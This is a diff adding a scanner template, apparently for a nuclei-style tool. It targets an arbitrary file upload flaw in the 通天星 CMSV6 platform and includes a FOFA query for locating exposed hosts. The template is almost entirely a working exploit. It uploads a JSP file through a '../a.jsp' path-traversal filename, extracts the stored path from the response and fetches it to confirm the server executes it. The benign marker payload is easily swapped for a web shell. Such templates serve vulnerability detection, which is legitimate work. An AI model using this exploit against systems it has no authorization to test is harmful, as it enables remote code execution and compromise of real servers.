@@ -1,0 +1,42 @@
+## id: VEID-2024-0503
+## name: 通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description: 通天星-CMSV6存在任意文件上传漏洞
+## fofa-query: body="./open/webApi.html"||body="/808gps/"
+## verification: true
+
+
+POST /inspect_file/upload HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b
+
+--2e7688d712bcc913201f327059f9976b
+Content-Disposition: form-data; name="uploadFile"; filename="../a.jsp"
+Content-Type: application/octet-stream
+
+<% out.println("hello veil"); %>
+--2e7688d712bcc913201f327059f9976b--
+
+
+#@ condition: and
+#@ matcher: body contains "filePath"
+#> extract: name=file_path, from=body, regex=/"filePath":\s*"([^"]*_a\.jsp)"/, group=1
+#@ matcher: status_code == 200
+
+---
+
+GET {{file_path}} HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: 7d10b4aea82290ff25b095b53d6e56220acf16014a1e6932f759a5d9ad5dc136
